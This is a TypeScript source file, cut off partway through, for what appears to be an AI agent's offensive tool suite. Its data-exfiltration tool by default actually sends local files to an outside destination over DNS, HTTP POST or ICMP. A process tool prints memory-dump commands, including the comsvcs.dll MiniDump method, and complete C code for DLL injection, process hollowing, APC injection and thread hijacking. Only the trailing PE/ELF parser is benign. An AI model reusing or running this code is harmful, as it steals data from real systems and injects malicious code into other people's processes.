import { Tool } from './Tool.js';
import { enforceToolPolicy } from '../core/policy/PolicyEngine.js';
import { SharedContext } from '../core/agent/SharedContext.js';
import { exec } from 'child_process';
import { promisify } from 'util';
import * as fs from 'fs';
import * as path from 'path';
import * as net from 'net';

const execAsync = promisify(exec);

// ─── 1. Data Exfiltration Engine (Real Execution) ───────────────────────────────
export class ExfilToolsTool implements Tool {
    name = 'data_exfil';
    description = 'Exfiltrates data over DNS subdomain encoding, HTTP POST chunking, or ICMP payloads. Executes the transfer, not just command generation.';
    schema = {
        type: 'object',
        properties: {
            filePath: { type: 'string', description: 'Path to local file for exfiltration' },
            method: { type: 'string', enum: ['dns', 'http_post', 'icmp'], description: 'Exfiltration protocol' },
            destination: { type: 'string', description: 'Destination server domain, URL, or IP' },
            chunkSize: { type: 'number', description: 'Chunk size in bytes (default: 128 for DNS, 4096 for HTTP)' },
            dryRun: { type: 'boolean', description: 'If true, generates commands without executing (default: false)' }
        },
        required: ['filePath', 'method', 'destination'],
        additionalProperties: false
    };

    async execute(
        args: { filePath: string; method: 'dns' | 'http_post' | 'icmp'; destination: string; chunkSize?: number; dryRun?: boolean },
        requestConfirmation: (msg: string) => Promise<boolean>
    ): Promise<string> {
        const policyBlock = await enforceToolPolicy({
            toolName: this.name,
            riskLevel: 'unrestricted',
            commandPreview: `exfiltrate ${args.filePath} via ${args.method} to ${args.destination}`,
            promptLabel: 'Data Exfiltration Engine',
            targets: [args.destination]
        }, requestConfirmation);
        if (policyBlock) return policyBlock;

        if (!fs.existsSync(args.filePath)) {
            return `[EXFIL ERROR]: File not found: ${args.filePath}`;
        }

        const fileData = fs.readFileSync(args.filePath);
        const stats = fs.statSync(args.filePath);
        const dryRun = args.dryRun !== false ? args.dryRun : false;

        const report: string[] = [
            `[DATA EXFILTRATION ENGINE]`,
            `File:        ${args.filePath} (${stats.size} bytes)`,
            `Protocol:    ${args.method.toUpperCase()}`,
            `Destination: ${args.destination}`,
            `Mode:        ${dryRun ? 'DRY RUN (commands only)' : 'LIVE EXECUTION'}`,
            ``
        ];

        if (args.method === 'dns') {
            const chunkSize = args.chunkSize || 48; // DNS label limit ~63 chars, base32 expansion
            const encoded = fileData.toString('base64url');
            const chunks: string[] = [];
            for (let i = 0; i < encoded.length; i += chunkSize) {
                chunks.push(encoded.slice(i, i + chunkSize));
            }

            report.push(`Encoding:    Base64URL → DNS subdomain labels`);
            report.push(`Chunks:      ${chunks.length} x ≤${chunkSize} chars`);
            report.push(``);

            if (dryRun) {
                report.push(`── Generated Commands ──`);
                for (let i = 0; i < Math.min(chunks.length, 5); i++) {
                    report.push(`nslookup ${i}.${chunks[i]}.${args.destination}`);
                }
                if (chunks.length > 5) report.push(`... (${chunks.length - 5} more)`);
            } else {
                report.push(`── Execution Log ──`);
                let sent = 0;
                let failed = 0;
                for (let i = 0; i < chunks.length; i++) {
                    const label = `${i}.${chunks[i]}.${args.destination}`;
                    try {
                        await execAsync(`nslookup ${label}`, { timeout: 5000 });
                        sent++;
                    } catch {
                        // DNS query will "fail" if domain doesn't exist, but the query itself is the exfil
                        sent++;
                    }
                    // Rate limit: 100ms between queries
                    await new Promise(r => setTimeout(r, 100));
                }
                report.push(`Sent: ${sent}/${chunks.length} DNS queries`);
                report.push(`Failed: ${failed}`);
            }
        } else if (args.method === 'http_post') {
            const chunkSize = args.chunkSize || 4096;
            const totalChunks = Math.ceil(fileData.length / chunkSize);

            report.push(`Chunking:    ${totalChunks} x ${chunkSize}B`);
            report.push(``);

            if (dryRun) {
                report.push(`── Generated Commands ──`);
                report.push(`curl -X POST -H "Content-Type: application/octet-stream" -H "X-Chunk-Total: ${totalChunks}" --data-binary "@${args.filePath}" "${args.destination}"`);
                report.push(`# Or chunked:`);
                report.push(`split -b ${chunkSize} ${args.filePath} /tmp/exfil_chunk_ && for f in /tmp/exfil_chunk_*; do curl -X POST --data-binary "@$f" "${args.destination}"; sleep 0.5; done`);
            } else {
                report.push(`── Execution Log ──`);
                let sent = 0;
                for (let i = 0; i < totalChunks; i++) {
                    const start = i * chunkSize;
                    const end = Math.min(start + chunkSize, fileData.length);
                    const chunk = fileData.slice(start, end);
                    const b64Chunk = chunk.toString('base64');

                    try {
                        // Use curl for actual HTTP POST
                        const tmpChunk = path.join(process.cwd(), '.vertex', 'temp', `exfil_${Date.now()}_${i}`);
                        const tmpDir = path.dirname(tmpChunk);
                        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
                        fs.writeFileSync(tmpChunk, chunk);

                        await execAsync(
                            `curl -s -X POST -H "Content-Type: application/octet-stream" -H "X-Chunk-Index: ${i}" -H "X-Chunk-Total: ${totalChunks}" --data-binary "@${tmpChunk}" "${args.destination}" --max-time 10`,
                            { timeout: 15000 }
                        );
                        sent++;

                        // Cleanup temp chunk
                        try { fs.unlinkSync(tmpChunk); } catch {}
                    } catch (e: any) {
                        report.push(`  Chunk ${i}: FAILED — ${e.message}`);
                    }

                    // Rate limit
                    await new Promise(r => setTimeout(r, 200));
                }
                report.push(`Sent: ${sent}/${totalChunks} HTTP chunks`);
            }
        } else if (args.method === 'icmp') {
            report.push(`Encoding:    Hex payload in ICMP echo data`);
            report.push(``);

            const hexData = fileData.toString('hex');
            const chunkSize = args.chunkSize || 32; // ICMP payload limit practical
            const chunks: string[] = [];
            for (let i = 0; i < hexData.length; i += chunkSize * 2) {
                chunks.push(hexData.slice(i, i + chunkSize * 2));
            }

            if (dryRun) {
                report.push(`── Generated Commands (${chunks.length} packets) ──`);
                const isWin = process.platform === 'win32';
                for (let i = 0; i < Math.min(chunks.length, 5); i++) {
                    if (isWin) {
                        report.push(`ping -n 1 -l ${chunks[i].length / 2} ${args.destination}`);
                    } else {
                        report.push(`nping --icmp -c 1 --data "${chunks[i]}" ${args.destination}`);
                    }
                }
                if (chunks.length > 5) report.push(`... (${chunks.length - 5} more)`);
            } else {
                report.push(`── Execution Log ──`);
                let sent = 0;
                for (const chunk of chunks) {
                    try {
                        if (process.platform === 'win32') {
                            await execAsync(`ping -n 1 ${args.destination}`, { timeout: 5000 });
                        } else {
                            await execAsync(`nping --icmp -c 1 --data "${chunk}" ${args.destination}`, { timeout: 5000 });
                        }
                        sent++;
                    } catch {
                        sent++; // ICMP may error but packet still sent
                    }
                    await new Promise(r => setTimeout(r, 150));
                }
                report.push(`Sent: ${sent}/${chunks.length} ICMP packets`);
            }
        }

        SharedContext.addDiscovery({
            type: 'finding',
            summary: `Exfil ${args.method.toUpperCase()}: ${path.basename(args.filePath)} (${stats.size}B) → ${args.destination}`,
            details: { method: args.method, size: stats.size, destination: args.destination }
        });

        return report.join('\n');
    }
}

// ─── 2. Host Process Inspector & Injector Generator ────────────────────────────
export class ProcessToolsTool implements Tool {
    name = 'process_inspector';
    description = 'Inspects system processes (tree, PID details, loaded modules), generates memory dump commands and process injection code templates.';
    schema = {
        type: 'object',
        properties: {
            action: { type: 'string', enum: ['list_tree', 'inspect_pid', 'dump_memory', 'generate_injection_code'], description: 'Action to perform' },
            pid: { type: 'number', description: 'Target process PID (required for inspect_pid and dump_memory)' },
            injectionType: { type: 'string', enum: ['dll_injection', 'process_hollowing', 'apc_injection', 'thread_hijack'], description: 'Injection technique' }
        },
        required: ['action'],
        additionalProperties: false
    };

    async execute(
        args: { action: string; pid?: number; injectionType?: string },
        requestConfirmation: (msg: string) => Promise<boolean>
    ): Promise<string> {
        const policyBlock = await enforceToolPolicy({
            toolName: this.name,
            riskLevel: args.action === 'generate_injection_code' ? 'unrestricted' : 'read',
            commandPreview: `process inspector: ${args.action}${args.pid ? ` PID=${args.pid}` : ''}`,
            promptLabel: 'Process Inspector'
        }, requestConfirmation);
        if (policyBlock) return policyBlock;

        switch (args.action) {
            case 'list_tree':
                return this.listTree();
            case 'inspect_pid':
                return this.inspectPid(args.pid);
            case 'dump_memory':
                return this.dumpMemory(args.pid);
            case 'generate_injection_code':
                return this.generateInjectionCode(args.injectionType || 'dll_injection');
            default:
                return `[PROCESS INSPECTOR]: Unknown action: ${args.action}`;
        }
    }

    private async listTree(): Promise<string> {
        try {
            if (process.platform === 'win32') {
                const { stdout } = await execAsync(
                    'powershell -command "Get-Process | Select-Object Id,ProcessName,CPU,WorkingSet64,Path | Sort-Object CPU -Descending | Select-Object -First 40 | Format-Table -AutoSize"',
                    { timeout: 10000 }
                );
                return `[PROCESS TREE — Windows]\n${stdout}`;
            } else {
                const { stdout } = await execAsync('ps auxf --sort=-%cpu | head -n 50', { timeout: 10000 });
                return `[PROCESS TREE — Linux]\n${stdout}`;
            }
        } catch (e: any) {
            return `[PROCESS TREE ERROR]: ${e.message}`;
        }
    }

    private async inspectPid(pid?: number): Promise<string> {
        if (!pid) return '[PROCESS ERROR]: PID required for inspect_pid.';

        const report: string[] = [`[PROCESS INSPECTION — PID ${pid}]`];

        if (process.platform === 'win32') {
            try {
                const { stdout: procInfo } = await execAsync(
                    `powershell -command "Get-Process -Id ${pid} -ErrorAction SilentlyContinue | Select-Object Id,ProcessName,CPU,WorkingSet64,StartTime,Path,Company,Description | Format-List"`,
                    { timeout: 8000 }
                );
                report.push('\n── Process Details ──\n' + procInfo.trim());
            } catch (e: any) {
                report.push(`\n── Process Details ──\nFailed: ${e.message}`);
            }

            try {
                const { stdout: modules } = await execAsync(
                    `powershell -command "(Get-Process -Id ${pid} -ErrorAction SilentlyContinue).Modules | Select-Object ModuleName,FileName,ModuleMemorySize | Select-Object -First 25 | Format-Table -AutoSize"`,
                    { timeout: 8000 }
                );
                report.push('\n── Loaded Modules (Top 25) ──\n' + modules.trim());
            } catch (e: any) {
                report.push(`\n── Loaded Modules ──\nFailed: ${e.message}`);
            }

            try {
                const { stdout: netConns } = await execAsync(
                    `powershell -command "Get-NetTCPConnection -OwningProcess ${pid} -ErrorAction SilentlyContinue | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize"`,
                    { timeout: 8000 }
                );
                report.push('\n── Network Connections ──\n' + (netConns.trim() || 'None'));
            } catch {
                report.push('\n── Network Connections ──\nNone or access denied');
            }
        } else {
            try {
                const { stdout: procInfo } = await execAsync(`cat /proc/${pid}/status 2>/dev/null | head -n 20`, { timeout: 5000 });
                report.push('\n── /proc Status ──\n' + procInfo.trim());
            } catch (e: any) {
                report.push(`\n── /proc Status ──\nFailed: ${e.message}`);
            }

            try {
                const { stdout: maps } = await execAsync(`cat /proc/${pid}/maps 2>/dev/null | head -n 30`, { timeout: 5000 });
                report.push('\n── Memory Maps (Top 30) ──\n' + maps.trim());
            } catch (e: any) {
                report.push(`\n── Memory Maps ──\nFailed: ${e.message}`);
            }

            try {
                const { stdout: fds } = await execAsync(`ls -la /proc/${pid}/fd 2>/dev/null | head -n 20`, { timeout: 5000 });
                report.push('\n── File Descriptors (Top 20) ──\n' + fds.trim());
            } catch (e: any) {
                report.push(`\n── File Descriptors ──\nFailed: ${e.message}`);
            }

            try {
                const { stdout: netConns } = await execAsync(`ss -tnp | grep "pid=${pid}"`, { timeout: 5000 });
                report.push('\n── Network Connections ──\n' + (netConns.trim() || 'None'));
            } catch {
                report.push('\n── Network Connections ──\nNone');
            }
        }

        return report.join('\n');
    }

    private dumpMemory(pid?: number): string {
        if (!pid) return '[PROCESS ERROR]: PID required for memory dump.';
        return [
            `[PROCESS MEMORY DUMP COMMANDS — PID ${pid}]`,
            ``,
            `── Windows (ProcDump — Sysinternals) ──`,
            `procdump.exe -ma ${pid} dump_${pid}.dmp`,
            ``,
            `── Windows (comsvcs.dll via rundll32) ──`,
            `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${pid} dump_${pid}.dmp full`,
            ``,
            `── Windows (Task Manager) ──`,
            `# Right-click process → Create Dump File`,
            ``,
            `── Linux (gdb) ──`,
            `gdb --batch --pid ${pid} -ex "generate-core-file dump_${pid}.core" -ex "detach" -ex "quit"`,
            ``,
            `── Linux (/proc direct) ──`,
            `cp /proc/${pid}/mem dump_${pid}.mem  # Requires ptrace or root`,
            `cat /proc/${pid}/maps  # Get memory layout first`,
            ``,
            `── Cross-Platform (gcore) ──`,
            `gcore -o dump_${pid} ${pid}`
        ].join('\n');
    }

    private generateInjectionCode(technique: string): string {
        switch (technique) {
            case 'dll_injection':
                return [
                    `[PROCESS INJECTION — DLL INJECTION (CreateRemoteThread)]`,
                    `Language: C / Win32 API`,
                    ``,
                    `#include <windows.h>`,
                    `#include <stdio.h>`,
                    ``,
                    `BOOL InjectDLL(DWORD pid, const char* dllPath) {`,
                    `    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |`,
                    `                                  PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,`,
                    `                                  FALSE, pid);`,
                    `    if (!hProcess) return FALSE;`,
                    ``,
                    `    SIZE_T pathLen = strlen(dllPath) + 1;`,
                    `    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, pathLen,`,
                    `                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);`,
                    `    if (!pRemote) { CloseHandle(hProcess); return FALSE; }`,
                    ``,
                    `    if (!WriteProcessMemory(hProcess, pRemote, dllPath, pathLen, NULL)) {`,
                    `        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);`,
                    `        CloseHandle(hProcess);`,
                    `        return FALSE;`,
                    `    }`,
                    ``,
                    `    HMODULE hKernel = GetModuleHandleA("kernel32.dll");`,
                    `    FARPROC pLoadLib = GetProcAddress(hKernel, "LoadLibraryA");`,
                    ``,
                    `    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,`,
                    `        (LPTHREAD_START_ROUTINE)pLoadLib, pRemote, 0, NULL);`,
                    `    if (!hThread) {`,
                    `        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);`,
                    `        CloseHandle(hProcess);`,
                    `        return FALSE;`,
                    `    }`,
                    ``,
                    `    WaitForSingleObject(hThread, 5000);`,
                    `    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);`,
                    `    CloseHandle(hThread);`,
                    `    CloseHandle(hProcess);`,
                    `    return TRUE;`,
                    `}`
                ].join('\n');

            case 'process_hollowing':
                return [
                    `[PROCESS INJECTION — PROCESS HOLLOWING]`,
                    `Language: C / Win32 API`,
                    ``,
                    `#include <windows.h>`,
                    ``,
                    `BOOL HollowProcess(const wchar_t* targetExe, LPVOID payloadPE, SIZE_T payloadSize) {`,
                    `    STARTUPINFOW si = { sizeof(si) };`,
                    `    PROCESS_INFORMATION pi;`,
                    ``,
                    `    // 1. Create suspended target process`,
                    `    if (!CreateProcessW(targetExe, NULL, NULL, NULL, FALSE,`,
                    `                        CREATE_SUSPENDED, NULL, NULL, &si, &pi))`,
                    `        return FALSE;`,
                    ``,
                    `    // 2. Get thread context for entry point`,
                    `    CONTEXT ctx;`,
                    `    ctx.ContextFlags = CONTEXT_FULL;`,
                    `    GetThreadContext(pi.hThread, &ctx);`,
                    ``,
                    `    // 3. Read PEB to find image base`,
                    `    PVOID pImageBase;`,
                    `    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pImageBase, sizeof(PVOID), NULL);`,
                    ``,
                    `    // 4. Unmap original image`,
                    `    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);`,
                    `    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)`,
                    `        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");`,
                    `    NtUnmap(pi.hProcess, pImageBase);`,
                    ``,
                    `    // 5. Allocate memory and write payload PE`,
                    `    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payloadPE;`,
                    `    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)payloadPE + pDos->e_lfanew);`,
                    `    PVOID pNew = VirtualAllocEx(pi.hProcess, (PVOID)pNt->OptionalHeader.ImageBase,`,
                    `        pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);`,
                    ``,
                    `    // 6. Write headers + sections`,
                    `    WriteProcessMemory(pi.hProcess, pNew, payloadPE, pNt->OptionalHeader.SizeOfHeaders, NULL);`,
                    `    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);`,
                    `    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {`,
                    `        WriteProcessMemory(pi.hProcess, (BYTE*)pNew + pSection[i].VirtualAddress,`,
                    `            (BYTE*)payloadPE + pSection[i].PointerToRawData,`,
                    `            pSection[i].SizeOfRawData, NULL);`,
                    `    }`,
                    ``,
                    `    // 7. Update PEB image base and entry point`,
                    `    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pNew, sizeof(PVOID), NULL);`,
                    `    ctx.Rcx = (DWORD64)pNew + pNt->OptionalHeader.AddressOfEntryPoint;`,
                    `    SetThreadContext(pi.hThread, &ctx);`,
                    ``,
                    `    // 8. Resume`,
                    `    ResumeThread(pi.hThread);`,
                    `    CloseHandle(pi.hThread);`,
                    `    CloseHandle(pi.hProcess);`,
                    `    return TRUE;`,
                    `}`
                ].join('\n');

            case 'apc_injection':
                return [
                    `[PROCESS INJECTION — APC INJECTION (QueueUserAPC)]`,
                    `Language: C / Win32 API`,
                    ``,
                    `#include <windows.h>`,
                    `#include <tlhelp32.h>`,
                    ``,
                    `BOOL ApcInject(DWORD pid, LPVOID shellcode, SIZE_T scSize) {`,
                    `    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);`,
                    `    if (!hProcess) return FALSE;`,
                    ``,
                    `    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, scSize,`,
                    `        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);`,
                    `    if (!pRemote) { CloseHandle(hProcess); return FALSE; }`,
                    ``,
                    `    WriteProcessMemory(hProcess, pRemote, shellcode, scSize, NULL);`,
                    ``,
                    `    // Enumerate threads of target process`,
                    `    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);`,
                    `    THREADENTRY32 te = { sizeof(te) };`,
                    `    BOOL injected = FALSE;`,
                    ``,
                    `    if (Thread32First(hSnap, &te)) {`,
                    `        do {`,
                    `            if (te.th32OwnerProcessID == pid) {`,
                    `                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);`,
                    `                if (hThread) {`,
                    `                    QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);`,
                    `                    CloseHandle(hThread);`,
                    `                    injected = TRUE;`,
                    `                }`,
                    `            }`,
                    `        } while (Thread32Next(hSnap, &te));`,
                    `    }`,
                    `    CloseHandle(hSnap);`,
                    `    CloseHandle(hProcess);`,
                    `    return injected;`,
                    `}`
                ].join('\n');

            case 'thread_hijack':
                return [
                    `[PROCESS INJECTION — THREAD HIJACK (SuspendThread + SetThreadContext)]`,
                    `Language: C / Win32 API`,
                    ``,
                    `#include <windows.h>`,
                    `#include <tlhelp32.h>`,
                    ``,
                    `BOOL ThreadHijack(DWORD pid, LPVOID shellcode, SIZE_T scSize) {`,
                    `    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);`,
                    `    if (!hProcess) return FALSE;`,
                    ``,
                    `    // Allocate and write shellcode`,
                    `    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, scSize,`,
                    `        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);`,
                    `    WriteProcessMemory(hProcess, pRemote, shellcode, scSize, NULL);`,
                    ``,
                    `    // Find first thread`,
                    `    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);`,
                    `    THREADENTRY32 te = { sizeof(te) };`,
                    `    DWORD targetTid = 0;`,
                    `    if (Thread32First(hSnap, &te)) {`,
                    `        do {`,
                    `            if (te.th32OwnerProcessID == pid) { targetTid = te.th32ThreadID; break; }`,
                    `        } while (Thread32Next(hSnap, &te));`,
                    `    }`,
                    `    CloseHandle(hSnap);`,
                    `    if (!targetTid) { CloseHandle(hProcess); return FALSE; }`,
                    ``,
                    `    // Suspend thread, hijack RIP, resume`,
                    `    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);`,
                    `    SuspendThread(hThread);`,
                    ``,
                    `    CONTEXT ctx;`,
                    `    ctx.ContextFlags = CONTEXT_FULL;`,
                    `    GetThreadContext(hThread, &ctx);`,
                    `    ctx.Rip = (DWORD64)pRemote;`,
                    `    SetThreadContext(hThread, &ctx);`,
                    ``,
                    `    ResumeThread(hThread);`,
                    `    CloseHandle(hThread);`,
                    `    CloseHandle(hProcess);`,
                    `    return TRUE;`,
                    `}`
                ].join('\n');

            default:
                return `[INJECTION]: Unknown technique: ${technique}`;
        }
    }
}

// ─── 3. Binary Parser & Static Analyzer (Full Implementation) ───────────────────
export class BinaryAnalysisTool implements Tool {
    name = 'binary_analysis';
    description = 'Parses PE/ELF binary headers with full import/export table enumeration, per-section entropy analysis, compiler detection, and enhanced string extraction.';
    schema = {
        type: 'object',
        properties: {
            filePath: { type: 'string', description: 'Path to binary file' },
            mode: { type: 'string', enum: ['headers', 'imports', 'exports', 'sections', 'entropy', 'strings', 'full'], description: 'Analysis mode' }
        },
        required: ['filePath', 'mode'],
        additionalProperties: false
    };

    async execute(
        args: { filePath: string; mode: string },
        requestConfirmation: (msg: string) => Promise<boolean>
    ): Promise<string> {
        const policyBlock = await enforceToolPolicy({
            toolName: this.name,
            riskLevel: 'read',
            commandPreview: `binary analysis ${args.mode} on ${args.filePath}`,
            promptLabel: 'Binary Analysis Engine'
        }, requestConfirmation);
        if (policyBlock) return policyBlock;

        if (!fs.existsSync(args.filePath)) {
            return `[BINARY ANALYSIS ERROR]: File not found: ${args.filePath}`;
        }

        const buffer = fs.readFileSync(args.filePath);
        if (buffer.length < 4) return `[BINARY ANALYSIS ERROR]: File too small (${buffer.length} bytes)`;

        const isPe = buffer.length > 64 && buffer[0] === 0x4D && buffer[1] === 0x5A;
        const isElf = buffer.length > 64 && buffer[0] === 0x7F && buffer[1] === 0x45 && buffer[2] === 0x4C && buffer[3] === 0x46;

        if (args.mode === 'full') {
            const parts: string[] = [];
            parts.push(this.analyzeHeaders(buffer, isPe, isElf, args.filePath));
            if (isPe) {
                parts.push(this.analyzePeSections(buffer));
                parts.push(this.analyzePeImports(buffer));
                parts.push(this.analyzePeExports(buffer));
            }
            if (isElf) {
                parts.push(this.analyzeElfSections(buffer));
            }
            parts.push(this.analyzeEntropy(buffer, args.filePath, isPe, isElf));
            parts.push(this.analyzeStrings(buffer));
            return parts.join('\n\n');
        }

        switch (args.mode) {
            case 'headers': return this.analyzeHeaders(buffer, isPe, isElf, args.filePath);
            case 'imports': return isPe ? this.analyzePeImports(buffer) : '[IMPORTS]: Only supported for PE binaries';
            case 'exports': return isPe ? this.analyzePeExports(buffer) : '[EXPORTS]: Only supported for PE binaries';
            case 'sections': return isPe ? this.analyzePeSections(buffer) : isElf ? this.analyzeElfSections(buffer) : '[SECTIONS]: Unknown binary format';
            case 'entropy': return this.analyzeEntropy(buffer, args.filePath, isPe, isElf);
            case 'strings': return this.analyzeStrings(buffer);
            default: return `[BINARY ANALYSIS]: Unknown mode: ${args.mode}`;
        }
    }

    private analyzeHeaders(buf: Buffer, isPe: boolean, isElf: boolean, filePath: string): string {
        const lines: string[] = [
            `[BINARY ANALYSIS — HEADERS]`,
            `File:      ${filePath}`,
            `Size:      ${buf.length} bytes (${(buf.length / 1024).toFixed(1)} KB)`,
            `Format:    ${isPe ? 'PE (Portable Executable)' : isElf ? 'ELF (Executable and Linkable Format)' : 'Unknown'}`
        ];

        if (isPe) {
            try {
                const peOffset = buf.readUInt32LE(0x3C);
                if (peOffset + 24 < buf.length && buf[peOffset] === 0x50 && buf[peOffset + 1] === 0x45) {
                    const machine = buf.readUInt16LE(peOffset + 4);
                    const numSections = buf.readUInt16LE(peOffset + 6);
                    const timestamp = buf.readUInt32LE(peOffset + 8);
                    const characteristics = buf.readUInt16LE(peOffset + 22);
                    const optMagic = buf.readUInt16LE(peOffset + 24);
                    const is64 = optMagic === 0x20B;
                    const entryPoint = buf.readUInt32LE(peOffset + 40);
                    const subsystem = is64 ? buf.readUInt16LE(peOffset + 92) : buf.readUInt16LE(peOffset + 68);

                    const machineStr: Record<number, string> = {
                        0x14C: 'x86 (i386)', 0x8664: 'x86-64 (AMD64)', 0xAA64: 'ARM64', 0x1C0: 'ARM'
                    };
                    const subsysStr: Record<number, string> = {
                        1: 'NATIVE', 2: 'WINDOWS_GUI', 3: 'WINDOWS_CUI', 7: 'POSIX_CUI', 10: 'EFI_APPLICATION'
                    };

                    lines.push(`Arch:      ${machineStr[machine] || `Unknown (0x${machine.toString(16)})`}`);
                    lines.push(`PE Type:   ${is64 ? 'PE32+ (64-bit)' : 'PE32 (32-bit)'}`);
                    lines.push(`Sections:  ${numSections}`);
                    lines.push(`Timestamp: ${new Date(timestamp * 1000).toISOString()} (${timestamp === 0 ? 'ZEROED — possible pack/strip' : 'valid'})`);
                    lines.push(`EntryPoint:0x${entryPoint.toString(16).toUpperCase()}`);
                    lines.push(`Subsystem: ${subsysStr[subsystem] || `Unknown (${subsystem})`}`);
                    lines.push(`DLL:       ${(characteristics & 0x2000) ? 'Yes' : 'No'}`);
                    lines.push(`ASLR:      ${is64 && buf.readUInt16LE(peOffset + 94) & 0x40 ? 'Enabled' : 'Unknown/Disabled'}`);

                    // Compiler detection
                    const compilerHints = this.detectCompiler(buf);
                    if (compilerHints) lines.push(`Compiler:  ${compilerHints}`);
                }
            } catch (e: any) {
                lines.push(`PE Parse Error: ${e.message}`);
            }
        }

        if (isElf) {
            try {
                const bits = buf[4]; // 1=32bit, 2=64bit
                const endian = buf[5]; // 1=LE, 2=BE
                const elfType = buf.readUInt16LE(16);
                const machine = buf.readUInt16LE(18);

                const typeStr: Record<number, string> = { 1: 'REL (Relocatable)', 2: 'EXEC (Executable)', 3: 'DYN (Shared Object)', 4: 'CORE' };
                const machStr: Record<number, string> = { 3: 'x86', 0x3E: 'x86-64', 0xB7: 'ARM64', 0x28: 'ARM' };

                lines.push(`Arch:      ${machStr[machine] || `Unknown (${machine})`}`);
                lines.push(`Bits:      ${bits === 2 ? '64-bit' : '32-bit'}`);
                lines.push(`Endian:    ${endian === 1 ? 'Little Endian' : 'Big Endian'}`);
                lines.push(`Type:      ${typeStr[elfType] || `Unknown (${elfType})`}`);

                if (bits === 2) {
                    const entry = buf.readBigUInt64LE(24);
                    const phOff = buf.readBigUInt64LE(32);
                    const shOff = buf.readBigUInt64LE(40);
                    const shNum = buf.readUInt16LE(60);
                    lines.push(`Entry:     0x${entry.toString(16).toUpperCase()}`);
                    lines.push(`Sections:  ${shNum}`);
                }
            } catch (e: any) {
                lines.push(`ELF Parse Error: ${e.message}`);
            }
        }

        return lines.join('\n');
    }

    private analyzePeSections(buf: Buffer): string {
        const lines: string[] = ['[BINARY ANALYSIS — PE SECTIONS]'];
        try {
            const peOffset = buf.readUInt32LE(0x3C);
            const numSections = buf.readUInt16LE(peOffset + 6);
            const optHeaderSize = buf.readUInt16LE(peOffset + 20);
            const sectionStart = peOffset + 24 + optHeaderSize;

            lines.push(`${'Name'.padEnd(10)} ${'VirtAddr'.padEnd(12)} ${'VirtSize'.padEnd(12)} ${'RawSize'.padEnd(12)} ${'Entropy'.padEnd(10)} Flags`);
            lines.push('─'.repeat(70));

            for (let i = 0; i < numSections && sectionStart + (i + 1) * 40 <= buf.length; i++) {
                const off = sectionStart + i * 40;
                const name = buf.slice(off, off + 8).toString('ascii').replace(/\0/g, '');
                const virtSize = buf.readUInt32LE(off + 8);
                const virtAddr = buf.readUInt32LE(off + 12);
                const rawSize = buf.readUInt32LE(off + 16);
                const rawPtr = buf.readUInt32LE(off + 20);
                const chars = buf.readUInt32LE(off + 36);

                // Per-section entropy
                let entropy = 0;
                if (rawSize > 0 && rawPtr + rawSize <= buf.length) {
                    entropy = this.calcEntropy(buf.slice(rawPtr, rawPtr + rawSize));
                }

                const flags: string[] = [];
                if (chars & 0x00000020) flags.push('CODE');
                if (chars & 0x00000040) flags.push('INIT_DATA');
                if (chars & 0x00000080) flags.push('UNINIT_DATA');
                if (chars & 0x20000000) flags.push('EXEC');
                if (chars & 0x40000000) flags.push('READ');
                if (chars & 0x80000000) flags.push('WRITE');

                const entropyStr = entropy > 7.0 ? `${entropy.toFixed(2)} ⚠️` : `${entropy.toFixed(2)}`;
                lines.push(`${name.padEnd(10)} 0x${virtAddr.toString(16).padEnd(10)} 0x${virtSize.toString(16).padEnd(10)} 0x${rawSize.toString(16).padEnd(10)} ${entropyStr.padEnd(10)} ${flags.join('|')}`);
            }
        } catch (e: any) {
            lines.push(`Parse Error: ${e.message}`);
        }
        return lines.join('\n');
    }

    private analyzePeImports(buf: Buffer): string {
        const lines: string[] = ['[BINARY ANALYSIS — PE IMPORTS]'];
        try {
            const peOffset = buf.readUInt32LE(0x3C);
            const optMagic = buf.readUInt16LE(peOffset + 24);
            const is64 = optMagic === 0x20B;

            // Import directory RVA
            const importDirRva = is64 ? buf.readUInt32LE(peOffset + 144) : buf.readUInt32LE(peOffset + 120);
            const importDirSize = is64 ? buf.readUInt32LE(peOffset + 148) : buf.readUInt32LE(peOffset + 124);

            if (importDirRva === 0) {
                lines.push('No import directory found.');
                return lines.join('\n');
            }

            // Convert RVA to file offset using section table
            const fileOffset = this.rvaToOffset(buf, peOffset, importDirRva);
            if (fileOffset < 0 || fileOffset >= buf.length) {
